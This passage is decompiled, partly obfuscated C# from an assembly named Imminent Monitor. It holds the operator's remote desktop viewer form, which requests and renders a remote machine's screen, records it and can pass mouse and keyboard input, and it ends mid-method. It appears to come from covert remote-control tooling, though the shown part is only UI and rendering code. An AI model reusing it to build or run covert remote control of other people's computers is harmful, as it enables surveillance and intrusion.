// Decompiled with JetBrains decompiler
// Type: FormDesktop
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

using Microsoft.VisualBasic.CompilerServices;
using SlimDX;
using SlimDX.Direct2D;
using SlimDX.DXGI;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Drawing.Text;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;

[DesignerGenerated]
public sealed class FormDesktop : Form
{
  private IContainer icontainer_0;
  private System.Windows.Forms.Timer timer_0;
  private Control0 control0_0;
  private Label label_0;
  private System.Windows.Forms.Timer timer_1;
  private MenuStrip menuStrip_0;
  private ToolStripMenuItem toolStripMenuItem_0;
  private ToolStripMenuItem toolStripMenuItem_1;
  private ToolStripMenuItem toolStripMenuItem_2;
  private ToolStripSeparator toolStripSeparator_0;
  private ToolStripMenuItem toolStripMenuItem_3;
  private ToolStripMenuItem toolStripMenuItem_4;
  private ToolStripMenuItem toolStripMenuItem_5;
  private ToolStripMenuItem toolStripMenuItem_6;
  private ToolStripMenuItem toolStripMenuItem_7;
  private ToolStripMenuItem toolStripMenuItem_8;
  private ToolStripSeparator toolStripSeparator_1;
  private ToolStripMenuItem toolStripMenuItem_9;
  private Panel panel_0;
  private GClass18 gclass18_0;
  private int int_0;
  private int int_1;
  private bool bool_0;
  private Image image_0;
  private bool bool_1;
  private Stopwatch stopwatch_0;
  private string string_0;
  private bool bool_2;
  private bool bool_3;
  private UserControlRemoteDesktopSettings userControlRemoteDesktopSettings_0;
  private bool bool_4;
  private string string_1;
  private int int_2;
  private bool bool_5;
  private Size size_0;
  private Factory factory_0;
  public bool bool_6;
  private Bitmap bitmap_0;
  private Rectangle[] rectangle_0;
  private Stopwatch stopwatch_1;

  public FormDesktop(GClass18 gclass18_1)
  {
    this.KeyDown += new KeyEventHandler(this.FormDesktop_KeyDown);
    this.Load += new EventHandler(this.FormDesktop_Load);
    this.KeyUp += new KeyEventHandler(this.FormDesktop_KeyUp);
    this.FormClosing += new FormClosingEventHandler(this.FormDesktop_FormClosing);
    this.int_0 = 0;
    this.int_1 = 0;
    this.bool_0 = true;
    this.stopwatch_0 = Stopwatch.StartNew();
    this.string_0 = (string) null;
    this.bool_2 = false;
    this.bool_3 = false;
    this.bool_4 = false;
    this.string_1 = Class132.smethod_0().FileSystem.SpecialDirectories.Temp;
    this.int_2 = 0;
    this.bool_5 = false;
    this.bool_6 = false;
    try
    {
      this.InitializeComponent();
      this.method_0(gclass18_1);
      this.method_4();
      this.method_2();
      this.method_1();
      Class97.smethod_11((Form) this);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      this.bool_0 = false;
      ProjectData.ClearProjectError();
    }
  }

  [DebuggerNonUserCode]
  protected override void Dispose(bool disposing)
  {
    try
    {
      if (!disposing || this.icontainer_0 == null)
        return;
      this.icontainer_0.Dispose();
    }
    finally
    {
      base.Dispose(disposing);
    }
  }

  [DebuggerStepThrough]
  private void InitializeComponent()
  {
    this.icontainer_0 = (IContainer) new System.ComponentModel.Container();
    ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (FormDesktop));
    this.vmethod_1(new System.Windows.Forms.Timer(this.icontainer_0));
    this.vmethod_5(new Label());
    this.vmethod_7(new System.Windows.Forms.Timer(this.icontainer_0));
    this.vmethod_3(new Control0());
    this.vmethod_9(new MenuStrip());
    this.vmethod_11(new ToolStripMenuItem());
    this.vmethod_13(new ToolStripMenuItem());
    this.vmethod_15(new ToolStripMenuItem());
    this.vmethod_23(new ToolStripMenuItem());
    this.vmethod_17(new ToolStripSeparator());
    this.vmethod_19(new ToolStripMenuItem());
    this.vmethod_21(new ToolStripMenuItem());
    this.vmethod_25(new ToolStripMenuItem());
    this.vmethod_27(new ToolStripMenuItem());
    this.vmethod_29(new ToolStripMenuItem());
    this.vmethod_31(new ToolStripSeparator());
    this.vmethod_33(new ToolStripMenuItem());
    this.vmethod_35(new Panel());
    this.vmethod_8().SuspendLayout();
    this.SuspendLayout();
    this.vmethod_0().Interval = 1150;
    this.vmethod_4().Anchor = AnchorStyles.None;
    this.vmethod_4().AutoSize = true;
    this.vmethod_4().BackColor = Color.Black;
    this.vmethod_4().ForeColor = Color.White;
    Label label1 = this.vmethod_4();
    Point point1 = new Point(363, 242);
    Point point2 = point1;
    label1.Location = point2;
    this.vmethod_4().Name = "LabelLoading";
    Label label2 = this.vmethod_4();
    Size size1 = new Size(137, 13);
    Size size2 = size1;
    label2.Size = size2;
    this.vmethod_4().TabIndex = 29;
    this.vmethod_4().Text = "Loading Remote Desktop";
    this.vmethod_4().Visible = false;
    this.vmethod_6().Interval = 1;
    this.vmethod_2().Anchor = AnchorStyles.None;
    this.vmethod_2().BackColor = Color.Black;
    this.vmethod_2().ForeColor = Color.FromArgb(0, 180, (int) byte.MaxValue);
    this.vmethod_2().method_3((Control0.Enum9) 0);
    Control0 control0_1 = this.vmethod_2();
    point1 = new Point(1, 258);
    Point point3 = point1;
    control0_1.Location = point3;
    this.vmethod_2().Name = "PreloaderLoading";
    this.vmethod_2().method_1(5);
    Control0 control0_2 = this.vmethod_2();
    size1 = new Size(859, 10);
    Size size3 = size1;
    control0_2.Size = size3;
    this.vmethod_2().TabIndex = 28;
    this.vmethod_2().Visible = false;
    this.vmethod_8().Font = new Font("Segoe UI", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    this.vmethod_8().Items.AddRange(new ToolStripItem[3]
    {
      (ToolStripItem) this.vmethod_10(),
      (ToolStripItem) this.vmethod_20(),
      (ToolStripItem) this.vmethod_24()
    });
    this.vmethod_8().LayoutStyle = ToolStripLayoutStyle.HorizontalStackWithOverflow;
    MenuStrip menuStrip1 = this.vmethod_8();
    point1 = new Point(0, 0);
    Point point4 = point1;
    menuStrip1.Location = point4;
    this.vmethod_8().Name = "MenuStrip1";
    MenuStrip menuStrip2 = this.vmethod_8();
    size1 = new Size(844, 24);
    Size size4 = size1;
    menuStrip2.Size = size4;
    this.vmethod_8().TabIndex = 30;
    this.vmethod_8().Text = "MenuStrip1";
    this.vmethod_10().DropDownItems.AddRange(new ToolStripItem[5]
    {
      (ToolStripItem) this.vmethod_12(),
      (ToolStripItem) this.vmethod_14(),
      (ToolStripItem) this.vmethod_22(),
      (ToolStripItem) this.vmethod_16(),
      (ToolStripItem) this.vmethod_18()
    });
    this.vmethod_10().Image = (Image) Class145.smethod_24();
    this.vmethod_10().Name = "ButtonControl";
    ToolStripMenuItem toolStripMenuItem1 = this.vmethod_10();
    size1 = new Size(74, 20);
    Size size5 = size1;
    toolStripMenuItem1.Size = size5;
    this.vmethod_10().Text = "Control";
    this.vmethod_12().Image = (Image) Class145.smethod_20();
    this.vmethod_12().Name = "ButtonStart";
    ToolStripMenuItem toolStripMenuItem2 = this.vmethod_12();
    size1 = new Size(126, 22);
    Size size6 = size1;
    toolStripMenuItem2.Size = size6;
    this.vmethod_12().Text = "Start";
    this.vmethod_14().Enabled = false;
    this.vmethod_14().Image = (Image) Class145.smethod_21();
    this.vmethod_14().Name = "ButtonStop";
    ToolStripMenuItem toolStripMenuItem3 = this.vmethod_14();
    size1 = new Size(126, 22);
    Size size7 = size1;
    toolStripMenuItem3.Size = size7;
    this.vmethod_14().Text = "Stop";
    this.vmethod_22().Image = (Image) Class145.smethod_47();
    this.vmethod_22().Name = "FullscreenToolStripMenuItem1";
    ToolStripMenuItem toolStripMenuItem4 = this.vmethod_22();
    size1 = new Size(126, 22);
    Size size8 = size1;
    toolStripMenuItem4.Size = size8;
    this.vmethod_22().Text = "Fullscreen";
    this.vmethod_16().Name = "ToolStripSeparator1";
    ToolStripSeparator toolStripSeparator1 = this.vmethod_16();
    size1 = new Size(123, 6);
    Size size9 = size1;
    toolStripSeparator1.Size = size9;
    this.vmethod_18().Image = (Image) Class145.smethod_4();
    this.vmethod_18().Name = "DToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem5 = this.vmethod_18();
    size1 = new Size(126, 22);
    Size size10 = size1;
    toolStripMenuItem5.Size = size10;
    this.vmethod_18().Text = "Record";
    this.vmethod_20().Image = (Image) Class145.smethod_61();
    this.vmethod_20().Name = "SettingsToolStripMenuItem1";
    ToolStripMenuItem toolStripMenuItem6 = this.vmethod_20();
    size1 = new Size(77, 20);
    Size size11 = size1;
    toolStripMenuItem6.Size = size11;
    this.vmethod_20().Text = "Settings";
    this.vmethod_24().DropDownItems.AddRange(new ToolStripItem[4]
    {
      (ToolStripItem) this.vmethod_26(),
      (ToolStripItem) this.vmethod_28(),
      (ToolStripItem) this.vmethod_30(),
      (ToolStripItem) this.vmethod_32()
    });
    this.vmethod_24().Image = (Image) Class145.smethod_50();
    this.vmethod_24().Name = "InputToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem7 = this.vmethod_24();
    size1 = new Size(63, 20);
    Size size12 = size1;
    toolStripMenuItem7.Size = size12;
    this.vmethod_24().Text = "Input";
    this.vmethod_26().Name = "EnableMouseToolStripMenuItem1";
    ToolStripMenuItem toolStripMenuItem8 = this.vmethod_26();
    size1 = new Size(204, 22);
    Size size13 = size1;
    toolStripMenuItem8.Size = size13;
    this.vmethod_26().Text = "Enable Mouse";
    this.vmethod_28().Name = "EnableMouseMovementToolStripMenuItem1";
    ToolStripMenuItem toolStripMenuItem9 = this.vmethod_28();
    size1 = new Size(204, 22);
    Size size14 = size1;
    toolStripMenuItem9.Size = size14;
    this.vmethod_28().Text = "Enable Mouse Movement";
    this.vmethod_30().Name = "ToolStripSeparator2";
    ToolStripSeparator toolStripSeparator2 = this.vmethod_30();
    size1 = new Size(201, 6);
    Size size15 = size1;
    toolStripSeparator2.Size = size15;
    this.vmethod_32().Name = "EnableKeyboardToolStripMenuItem1";
    ToolStripMenuItem toolStripMenuItem10 = this.vmethod_32();
    size1 = new Size(204, 22);
    Size size16 = size1;
    toolStripMenuItem10.Size = size16;
    this.vmethod_32().Text = "Enable Keyboard";
    this.vmethod_34().BackColor = Color.Black;
    this.vmethod_34().Dock = DockStyle.Fill;
    Panel panel1 = this.vmethod_34();
    point1 = new Point(0, 24);
    Point point5 = point1;
    panel1.Location = point5;
    this.vmethod_34().Name = "PanelDesktop";
    Panel panel2 = this.vmethod_34();
    size1 = new Size(844, 487);
    Size size17 = size1;
    panel2.Size = size17;
    this.vmethod_34().TabIndex = 31;
    this.AutoScaleDimensions = new SizeF(6f, 13f);
    this.AutoScaleMode = AutoScaleMode.Font;
    this.BackColor = Color.White;
    size1 = new Size(844, 511);
    this.ClientSize = size1;
    this.Controls.Add((Control) this.vmethod_4());
    this.Controls.Add((Control) this.vmethod_2());
    this.Controls.Add((Control) this.vmethod_34());
    this.Controls.Add((Control) this.vmethod_8());
    this.DoubleBuffered = true;
    this.Font = new Font("Segoe UI", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
    this.MainMenuStrip = this.vmethod_8();
    this.Name = nameof (FormDesktop);
    this.StartPosition = FormStartPosition.CenterScreen;
    this.Text = "X/X - Remote Desktop";
    this.vmethod_8().ResumeLayout(false);
    this.vmethod_8().PerformLayout();
    this.ResumeLayout(false);
    this.PerformLayout();
  }

  internal virtual System.Windows.Forms.Timer vmethod_0() => this.timer_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_1(System.Windows.Forms.Timer timer_2) => this.timer_0 = timer_2;

  internal virtual Control0 vmethod_2() => this.control0_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_3(Control0 control0_1) => this.control0_0 = control0_1;

  internal virtual Label vmethod_4() => this.label_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_5(Label label_1) => this.label_0 = label_1;

  internal virtual System.Windows.Forms.Timer vmethod_6() => this.timer_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_7(System.Windows.Forms.Timer timer_2) => this.timer_1 = timer_2;

  internal virtual MenuStrip vmethod_8() => this.menuStrip_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_9(MenuStrip menuStrip_1) => this.menuStrip_0 = menuStrip_1;

  internal virtual ToolStripMenuItem vmethod_10() => this.toolStripMenuItem_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_11(ToolStripMenuItem toolStripMenuItem_10) => this.toolStripMenuItem_0 = toolStripMenuItem_10;

  internal virtual ToolStripMenuItem vmethod_12() => this.toolStripMenuItem_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_13(ToolStripMenuItem toolStripMenuItem_10)
  {
    EventHandler eventHandler = new EventHandler(this.method_20);
    if (this.toolStripMenuItem_1 != null)
      this.toolStripMenuItem_1.Click -= eventHandler;
    this.toolStripMenuItem_1 = toolStripMenuItem_10;
    if (this.toolStripMenuItem_1 == null)
      return;
    this.toolStripMenuItem_1.Click += eventHandler;
  }

  internal virtual ToolStripMenuItem vmethod_14() => this.toolStripMenuItem_2;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_15(ToolStripMenuItem toolStripMenuItem_10)
  {
    EventHandler eventHandler = new EventHandler(this.method_21);
    if (this.toolStripMenuItem_2 != null)
      this.toolStripMenuItem_2.Click -= eventHandler;
    this.toolStripMenuItem_2 = toolStripMenuItem_10;
    if (this.toolStripMenuItem_2 == null)
      return;
    this.toolStripMenuItem_2.Click += eventHandler;
  }

  internal virtual ToolStripSeparator vmethod_16() => this.toolStripSeparator_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_17(ToolStripSeparator toolStripSeparator_2) => this.toolStripSeparator_0 = toolStripSeparator_2;

  internal virtual ToolStripMenuItem vmethod_18() => this.toolStripMenuItem_3;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_19(ToolStripMenuItem toolStripMenuItem_10)
  {
    EventHandler eventHandler = new EventHandler(this.method_33);
    if (this.toolStripMenuItem_3 != null)
      this.toolStripMenuItem_3.Click -= eventHandler;
    this.toolStripMenuItem_3 = toolStripMenuItem_10;
    if (this.toolStripMenuItem_3 == null)
      return;
    this.toolStripMenuItem_3.Click += eventHandler;
  }

  internal virtual ToolStripMenuItem vmethod_20() => this.toolStripMenuItem_4;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_21(ToolStripMenuItem toolStripMenuItem_10) => this.toolStripMenuItem_4 = toolStripMenuItem_10;

  internal virtual ToolStripMenuItem vmethod_22() => this.toolStripMenuItem_5;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_23(ToolStripMenuItem toolStripMenuItem_10)
  {
    EventHandler eventHandler = new EventHandler(this.method_25);
    if (this.toolStripMenuItem_5 != null)
      this.toolStripMenuItem_5.Click -= eventHandler;
    this.toolStripMenuItem_5 = toolStripMenuItem_10;
    if (this.toolStripMenuItem_5 == null)
      return;
    this.toolStripMenuItem_5.Click += eventHandler;
  }

  internal virtual ToolStripMenuItem vmethod_24() => this.toolStripMenuItem_6;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_25(ToolStripMenuItem toolStripMenuItem_10) => this.toolStripMenuItem_6 = toolStripMenuItem_10;

  internal virtual ToolStripMenuItem vmethod_26() => this.toolStripMenuItem_7;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_27(ToolStripMenuItem toolStripMenuItem_10)
  {
    EventHandler eventHandler = new EventHandler(this.method_23);
    if (this.toolStripMenuItem_7 != null)
      this.toolStripMenuItem_7.Click -= eventHandler;
    this.toolStripMenuItem_7 = toolStripMenuItem_10;
    if (this.toolStripMenuItem_7 == null)
      return;
    this.toolStripMenuItem_7.Click += eventHandler;
  }

  internal virtual ToolStripMenuItem vmethod_28() => this.toolStripMenuItem_8;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_29(ToolStripMenuItem toolStripMenuItem_10)
  {
    EventHandler eventHandler = new EventHandler(this.method_22);
    if (this.toolStripMenuItem_8 != null)
      this.toolStripMenuItem_8.Click -= eventHandler;
    this.toolStripMenuItem_8 = toolStripMenuItem_10;
    if (this.toolStripMenuItem_8 == null)
      return;
    this.toolStripMenuItem_8.Click += eventHandler;
  }

  internal virtual ToolStripSeparator vmethod_30() => this.toolStripSeparator_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_31(ToolStripSeparator toolStripSeparator_2) => this.toolStripSeparator_1 = toolStripSeparator_2;

  internal virtual ToolStripMenuItem vmethod_32() => this.toolStripMenuItem_9;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_33(ToolStripMenuItem toolStripMenuItem_10)
  {
    EventHandler eventHandler = new EventHandler(this.method_24);
    if (this.toolStripMenuItem_9 != null)
      this.toolStripMenuItem_9.Click -= eventHandler;
    this.toolStripMenuItem_9 = toolStripMenuItem_10;
    if (this.toolStripMenuItem_9 == null)
      return;
    this.toolStripMenuItem_9.Click += eventHandler;
  }

  internal virtual Panel vmethod_34() => this.panel_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_35(Panel panel_1)
  {
    MouseEventHandler mouseEventHandler1 = new MouseEventHandler(this.method_31);
    MouseEventHandler mouseEventHandler2 = new MouseEventHandler(this.method_30);
    MouseEventHandler mouseEventHandler3 = new MouseEventHandler(this.method_29);
    MouseEventHandler mouseEventHandler4 = new MouseEventHandler(this.method_28);
    if (this.panel_0 != null)
    {
      this.panel_0.MouseWheel -= mouseEventHandler1;
      this.panel_0.MouseMove -= mouseEventHandler2;
      this.panel_0.MouseUp -= mouseEventHandler3;
      this.panel_0.MouseDown -= mouseEventHandler4;
    }
    this.panel_0 = panel_1;
    if (this.panel_0 == null)
      return;
    this.panel_0.MouseWheel += mouseEventHandler1;
    this.panel_0.MouseMove += mouseEventHandler2;
    this.panel_0.MouseUp += mouseEventHandler3;
    this.panel_0.MouseDown += mouseEventHandler4;
  }

  private void method_0(GClass18 gclass18_1)
  {
    this.gclass18_0 = gclass18_1;
    this.vmethod_34().BackgroundImageLayout = ImageLayout.Stretch;
    this.gclass18_0.method_20().formDesktop_0 = this;
    this.KeyPreview = true;
    this.MinimumSize = new Size(477, 332);
  }

  private void method_1()
  {
    this.string_1 = this.string_1 + "\\" + string.Format("{0}RD", (object) this.gclass18_0.method_20().string_1);
    if (Directory.Exists(this.string_1))
      return;
    Directory.CreateDirectory(this.string_1);
  }

  private void method_2()
  {
    this.Text = string.Format("{0}/{1} - Remote Desktop", (object) this.gclass18_0.method_20().string_15, (object) this.gclass18_0.method_20().string_1);
    this.string_0 = string.Format("{0}/{1} - Remote Desktop", (object) this.gclass18_0.method_20().string_15, (object) this.gclass18_0.method_20().string_1);
  }

  private void FormDesktop_Load(object sender, EventArgs e)
  {
    Class97.smethod_16(this.vmethod_8());
    this.method_3();
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.gclass18_0, new object[2]
    {
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Desktop,
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.RemoteDesktopPacket.Screen
    });
  }

  private void method_3()
  {
    if (this.userControlRemoteDesktopSettings_0 == null)
      this.userControlRemoteDesktopSettings_0 = new UserControlRemoteDesktopSettings(this.gclass18_0);
    this.vmethod_20().DropDown = (ToolStripDropDown) new GClass14((Control) this.userControlRemoteDesktopSettings_0);
    this.userControlRemoteDesktopSettings_0.vmethod_18().SelectedIndex = 0;
  }

  private void method_4()
  {
    if (Class97.smethod_22(this.gclass18_0.method_20().string_12, "5.0.0.7"))
      return;
    int num = (int) MessageBox.Show("Please update your client to the latest version, with the same build settings in order to use this feature", "Imminent Monitor", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
    this.Close();
  }

  private void method_5()
  {
    int num = 0;
    if (this.userControlRemoteDesktopSettings_0.vmethod_10().Checked)
      num = 1;
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.gclass18_0, new object[7]
    {
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Desktop,
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.RemoteDesktopPacket.Initialize,
      (object) this.userControlRemoteDesktopSettings_0.vmethod_2().Value,
      (object) this.userControlRemoteDesktopSettings_0.vmethod_18().SelectedIndex,
      (object) false,
      (object) this.userControlRemoteDesktopSettings_0.vmethod_6().Value,
      (object) num
    });
  }

  private void method_6() => dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.gclass18_0, new object[2]
  {
    (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Desktop,
    (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.RemoteDesktopPacket.Disconnect
  });

  public void method_7(byte[] byte_0)
  {
    FormDesktop.Class82 class82 = new FormDesktop.Class82();
    class82.formDesktop_0 = this;
    class82.int_0 = byte_0.Length;
    if (byte_0[0] == (byte) 81 & byte_0[1] == (byte) 67 & byte_0[2] == (byte) 76 & byte_0[3] == (byte) 90)
      byte_0 = LZLoader.Load.Decompress(byte_0, 0U);
    Rectangle[] rectangle_1 = new Rectangle[0];
    using (MemoryStream stream_0 = new MemoryStream(byte_0))
      this.Invoke((Delegate) new Delegate0(new FormDesktop.Class82.Class83()
      {
        class82_0 = class82,
        image_0 = (Image) this.method_19((Stream) stream_0, ref rectangle_1)
      }._Lambda\u0024__55));
  }

  public void method_8(string string_2)
  {
    if (this.InvokeRequired)
    {
      this.Invoke((Delegate) new Class97.Delegate12(this.method_8), (object) string_2);
    }
    else
    {
      if (!this.bool_1)
      {
        this.userControlRemoteDesktopSettings_0.vmethod_18().Items.Clear();
        this.bool_1 = true;
      }
      this.userControlRemoteDesktopSettings_0.vmethod_18().Items.Add((object) string_2);
      this.userControlRemoteDesktopSettings_0.vmethod_18().SelectedIndex = 0;
    }
  }

  public void method_9() => this.vmethod_4().Text = "Performing first time DXGI Setup";

  public void method_10()
  {
    this.vmethod_12().Enabled = true;
    this.vmethod_14().Enabled = false;
    this.vmethod_34().BackgroundImage = (Image) null;
    this.bitmap_0 = (Bitmap) null;
  }

  public void method_11()
  {
    if (this.gclass18_0.method_20().gclass18_1 == null || !this.gclass18_0.method_20().gclass18_1.method_25())
      return;
    this.gclass18_0.method_20().gclass18_1.method_32();
  }

  public void method_12()
  {
    this.bitmap_0 = (Bitmap) null;
    this.rectangle_0 = (Rectangle[]) null;
  }

  private void method_13(Bitmap bitmap_1, int int_3)
  {
    Bitmap bitmap_1_1 = (Bitmap) bitmap_1.Clone();
    if (this.userControlRemoteDesktopSettings_0.vmethod_24().Checked | this.userControlRemoteDesktopSettings_0.vmethod_22().Checked)
    {
      using (Graphics graphics_0 = Graphics.FromImage((Image) bitmap_1_1))
      {
        if (this.userControlRemoteDesktopSettings_0.vmethod_22().Checked)
        {
          graphics_0.TextRenderingHint = TextRenderingHint.AntiAlias;
          this.method_16(graphics_0, 0, 2, "FPS:    " + Conversions.ToString(this.int_1));
          this.method_16(graphics_0, 0, 22, "Block Size: " + Class97.gclass21_0.method_60((long) int_3));
        }
        if (this.userControlRemoteDesktopSettings_0.vmethod_24().Checked)
        {
          if (this.rectangle_0 != null)
          {
            if (this.rectangle_0.Length > 0)
              graphics_0.DrawRectangles(Pens.Red, this.rectangle_0);
          }
        }
      }
    }
    this.method_14(bitmap_1_1);
    if (this.bool_4)
      this.image_0 = (Image) bitmap_1.Clone();
    ++this.int_0;
  }

  private void method_14(Bitmap bitmap_1)
  {
    try
    {
      if (this.bool_0)
        this.method_17(bitmap_1);
      else
        this.vmethod_34().BackgroundImage = (Image) bitmap_1;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      this.vmethod_34().BackgroundImage = (Image) bitmap_1;
      ProjectData.ClearProjectError();
    }
  }

  public void method_15(string string_2)
  {
    this.method_14((Bitmap) Class97.smethod_29(string_2));
    ++this.int_0;
  }

  private void method_16(Graphics graphics_0, int int_3, int int_4, string string_2)
  {
    graphics_0.DrawString(string_2, new Font("Verdana", 16f, FontStyle.Bold), Brushes.Black, (float) (int_3 + 1), (float) (int_4 + 1));
    graphics_0.DrawString(string_2, new Font("Verdana", 16f, FontStyle.Bold), Brushes.Red, (float) int_3, (float) int_4);
  }

  private void method_17(Bitmap bitmap_1)
  {
    if (this.factory_0 == null)
      this.factory_0 = new Factory((FactoryType) 1, (DebugLevel) 0);
    WindowRenderTarget windowRenderTarget1;
    if ((double) Class97.float_0 > 96.0)
    {
      Size size = new Size((int) Math.Round((double) (Class97.float_0 / 96f * (float) this.vmethod_34().Width)), (int) Math.Round((double) (Class97.float_0 / 96f * (float) this.vmethod_34().Height)));
      Factory factory0 = this.factory_0;
      WindowRenderTargetProperties targetProperties1 = new WindowRenderTargetProperties();
      ((WindowRenderTargetProperties) ref targetProperties1).Handle = this.vmethod_34().Handle;
      ((WindowRenderTargetProperties) ref targetProperties1).PixelSize = size;
      ((WindowRenderTargetProperties) ref targetProperties1).PresentOptions = (PresentOptions) 2;
      WindowRenderTargetProperties targetProperties2 = targetProperties1;
      windowRenderTarget1 = new WindowRenderTarget(factory0, targetProperties2);
    }
    else
    {
      Factory factory0 = this.factory_0;
      WindowRenderTargetProperties targetProperties3 = new WindowRenderTargetProperties();
      ((WindowRenderTargetProperties) ref targetProperties3).Handle = this.vmethod_34().Handle;
      ((WindowRenderTargetProperties) ref targetProperties3).PixelSize = this.vmethod_34().Size;
      ((WindowRenderTargetProperties) ref targetProperties3).PresentOptions = (PresentOptions) 2;
      WindowRenderTargetProperties targetProperties4 = targetProperties3;
      windowRenderTarget1 = new WindowRenderTarget(factory0, targetProperties4);
    }
    ((RenderTarget) windowRenderTarget1).BeginDraw();
    ((RenderTarget) windowRenderTarget1).AntialiasMode = (AntialiasMode) 1;
    WindowRenderTarget windowRenderTarget2 = windowRenderTarget1;
    Color4 color4_1;
    // ISSUE: explicit constructor call
    ((Color4) ref color4_1).\u002Ector(Color.LightSteelBlue);
    Color4 color4_2 = color4_1;
    ((RenderTarget) windowRenderTarget2).Clear(color4_2);
    Bitmap bitmap1 = bitmap_1;
    Bitmap bitmap2 = bitmap1;
    Rectangle rectangle1 = new Rectangle(new Point(0, 0), bitmap1.Size);
    Rectangle rect = rectangle1;
    BitmapData bitmapdata = bitmap2.LockBits(rect, ImageLockMode.ReadOnly, PixelFormat.Format32bppPArgb);
    DataStream dataStream = new DataStream(bitmapdata.Scan0, (long) (bitmapdata.Stride * bitmapdata.Height), true, false);
    PixelFormat pixelFormat;
    // ISSUE: explicit constructor call
    ((PixelFormat) ref pixelFormat).\u002Ector((Format) 87, (AlphaMode) 1);
    BitmapProperties bitmapProperties = new BitmapProperties();
    ((BitmapProperties) ref bitmapProperties).PixelFormat = pixelFormat;
    Bitmap bitmap3 = new Bitmap((RenderTarget) windowRenderTarget1, new Size(bitmap1.Width, bitmap1.Height), dataStream, bitmapdata.Stride, bitmapProperties);
    bitmap1.UnlockBits(bitmapdata);
    WindowRenderTarget windowRenderTarget3 = windowRenderTarget1;
    Bitmap bitmap4 = bitmap3;
    rectangle1 = new Rectangle(0, 0, this.vmethod_34().Width, this.vmethod_34().Height);
    Rectangle rectangle2 = rectangle1;
    ((RenderTarget) windowRenderTarget3).DrawBitmap(bitmap4, rectangle2);
    ((RenderTarget) windowRenderTarget1).EndDraw();
    ((ComObject) bitmap3).Dispose();
    bitmap1.Dispose();
    ((ComObject) windowRenderTarget1).Dispose();
  }

  private void method_18()
  {
    while (this.bool_6)
    {
      try
      {
        if (this == null)
          break;
        this.int_0 = this.int_0;
        if (this.int_0 != 0)
          this.int_0 += 3;
        this.Invoke((Delegate) (() => this.Text = string.Format("{0} - FPS: {1}", (object) this.string_0, (object) this.int_0)));
        this.int_1 = this.int_0;
        this.int_0 = 0;
        GC.Collect();
        Thread.Sleep(1000);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }

  public Bitmap method_19(Stream stream_0, ref Rectangle[] rectangle_1)
  {
    rectangle_1 = new Rectangle[0];
    byte[] buffer1 = new byte[4];
    if (this.bitmap_0 == null)
    {
      stream_0.Read(buffer1, 0, 4);
      BitConverter.ToInt32(buffer1, 0);
      stream_0.Read(buffer1, 0, 4);
      BitConverter.ToInt32(buffer1, 0);
      stream_0.Read(buffer1, 0, 4);
      byte[] buffer2 = new byte[BitConverter.ToInt32(buffer1, 0) - 1 + 1];
      stream_0.Read(buffer2, 0, buffer2.Length);
      this.bitmap_0 = (Bitmap) Image.FromStream((Stream) new MemoryStream(buffer2));
      stream_0.Dispose();
      return this.bitmap_0;
    }
    List<Rectangle> rectangleList = new List<Rectangle>();
    while (stream_0.Position < stream_0.Length)
    {
      stream_0.Read(buffer1, 0, 4);
      int int32_1 = BitConverter.ToInt32(buffer1, 0);
